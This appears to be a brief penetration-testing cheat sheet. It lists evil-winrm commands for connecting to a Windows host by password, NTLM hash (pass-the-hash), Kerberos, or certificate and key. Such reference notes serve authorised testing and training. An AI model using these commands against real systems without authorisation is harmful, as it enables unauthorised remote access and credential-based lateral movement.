Connect by password

evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>

Connect by hash

evil-winrm -i <TARGET> -u <USER> -H <HASH>

Connect by kerberos

sudo ntpdate -s <DC> && evil-winrm -i <TARGET> -r <DOMAIN>

Connect by .crt and .key

evil-winrm -i <TARGET> -S -k auth.key -c auth.crt
